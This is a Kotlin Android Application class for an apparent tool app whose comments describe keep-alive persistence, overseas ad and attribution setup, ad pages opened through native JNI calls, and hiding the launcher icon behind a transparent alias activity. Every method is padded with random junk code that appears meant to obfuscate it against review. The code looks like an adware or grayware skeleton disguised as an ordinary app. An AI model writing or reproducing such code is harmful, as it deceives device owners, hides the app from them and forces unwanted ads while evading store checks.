package jtdq.umer.fhgc

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import jtdq.umer.fhgc.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import jtdq.iwd.qldmd.base.APPContext
import jtdq.iwd.qldmd.base.BaseApplication
import jtdq.iwd.qldmd.base.OverseaAppHost
import jtdq.iwd.qldmd.base.OverseaAppInitializer
import jtdq.iwd.qldmd.ad.runtime.AdLifecycleInstaller


class ACP : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: ACP? = null
    }

    override fun onCreate() {
        val arr_ooLeQIIBBPJoxFwXh = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_strVLSZcZdltQlUbs  = (arr_ooLeQIIBBPJoxFwXh  shl 15) xor (arr_ooLeQIIBBPJoxFwXh  shr 73)
         val j_IjQklyWf  = i_strVLSZcZdltQlUbs .inv() and 0xFFFF
         if (j_IjQklyWf  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_VJDiYBVQWTgmaGrAkG")
         }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val UleNbeesJIz : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val OAmdzkZQR  = UleNbeesJIz ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_13" 
            }
            if (OAmdzkZQR .startsWith("VzZBCxFQjR ")) {
                android.util.Log.v("TAG", OAmdzkZQR )
            }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_OhadwlIrG  = listOf("xGBNuCB", "ikzwBGPYVqjqWNGum", "xgHFkMFEaMkpW").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_euaWcnrZiywOpDpwC  = arr_OhadwlIrG .filter { it.length > 8 }
         if (ad_euaWcnrZiywOpDpwC .isNotEmpty() && java.lang.System.currentTimeMillis() < 81) {
             ad_euaWcnrZiywOpDpwC .forEach { _ ->  }
         }
        UUIH.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_dQNmqhjTqVFzxwjeLiV  = listOf("AIVnWMHqehhuZiWItf", "VCIKUMKZ", "agtBk").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_mGYRp  = arr_dQNmqhjTqVFzxwjeLiV .filter { it.length > 77 }
         if (ad_mGYRp .isNotEmpty() && java.lang.System.currentTimeMillis() < 69) {
             ad_mGYRp .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val qbClJWqbcg : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val RUiGd  = qbClJWqbcg ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_3" 
            }
            if (RUiGd .startsWith("JRGeAzKxgZZ ")) {
                android.util.Log.v("TAG", RUiGd )
            }
        // 启动图标隐藏：禁用 UUGN 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, UUGO::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    }


    override fun initKeepPower(app: Application) {
        val NRomUAaknCLJyQ : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val RhYDcaAQp  = NRomUAaknCLJyQ ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_34" 
            }
            if (RhYDcaAQp .startsWith("rWTGAiOgcdeVrJxiqq ")) {
                android.util.Log.v("TAG", RhYDcaAQp )
            }
        NativeJniUtils.virinit(insApp)
    }

}